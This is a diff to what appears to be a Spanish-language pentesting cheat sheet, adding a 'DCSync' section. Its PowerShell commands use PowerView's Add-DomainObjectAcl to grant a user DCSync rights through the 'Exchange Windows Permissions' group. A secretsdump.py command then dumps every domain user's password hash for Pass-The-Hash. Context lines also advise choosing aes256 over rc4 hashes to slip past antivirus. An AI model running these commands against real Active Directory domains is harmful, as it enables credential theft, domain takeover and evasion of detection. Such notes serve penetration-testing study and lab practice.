@@ -74,3 +74,19 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 
 Nota: Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
 ```
+
+## DCSync 
+
+```powershell
+Si se tiene un usuario en el grupo 'Exchange Windows Permissions', se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash
+
+❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
+❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity <user> -Rights DCSync 
+
+Nota: El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'
+
+
+# En Kali ejecutar el siguiente comando para hacer el DCSync
+❯ secretsdump.py domain1.local/user@IP-DC    # Ejecutar el DCSync con las credenciales del usuario creado en el DC
+```
